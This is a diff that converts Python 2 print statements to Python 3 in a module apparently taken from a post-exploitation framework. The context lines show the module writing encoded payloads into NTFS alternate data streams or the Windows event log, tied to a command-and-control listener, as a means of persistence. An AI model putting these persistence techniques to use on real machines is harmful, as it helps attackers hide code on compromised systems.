@@ -1,3 +1,4 @@
+from __future__ import print_function
 import os
 from lib.common import helpers
 
@@ -131,7 +132,7 @@ class Module:
         if cleanup.lower() == 'true':
             if adsPath != '':
                 if ".txt" not in adsPath:
-                    print helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt")
+                    print(helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt"))
                     return ""
 
                 script = "Invoke-Command -ScriptBlock {cmd /C \"echo x > "+adsPath+"\"};"
@@ -165,14 +166,14 @@ class Module:
                 statusMsg += "using external file " + extFile
 
             else:
-                print helpers.color("[!] File does not exist: " + extFile)
+                print(helpers.color("[!] File does not exist: " + extFile))
                 return ""
 
         else:
             # if an external file isn't specified, use a listener
             if not self.mainMenu.listeners.is_listener_valid(listenerName):
                 # not a valid listener, return nothing for the script
-                print helpers.color("[!] Invalid listener: " + listenerName)
+                print(helpers.color("[!] Invalid listener: " + listenerName))
                 return ""
 
             else:
@@ -188,7 +189,7 @@ class Module:
             
             if adsPath != '':
                 if ".txt" not in adsPath:
-                    print helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt")
+                    print(helpers.color("[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt"))
                     return ""
             
             	script = "Invoke-Command -ScriptBlock {cmd /C \"echo "+encScript+" > "+adsPath+"\"};"
@@ -202,7 +203,7 @@ class Module:
 
             # sanity check to make sure we haven't exceeded the 31389 byte max
             if len(encScript) > 31389:
-                print helpers.color("[!] Warning: encoded script exceeds 31389 byte max.")
+                print(helpers.color("[!] Warning: encoded script exceeds 31389 byte max."))
                 return ""
 
             statusMsg += " stored in Application event log under EventID " + eventLogID + "."
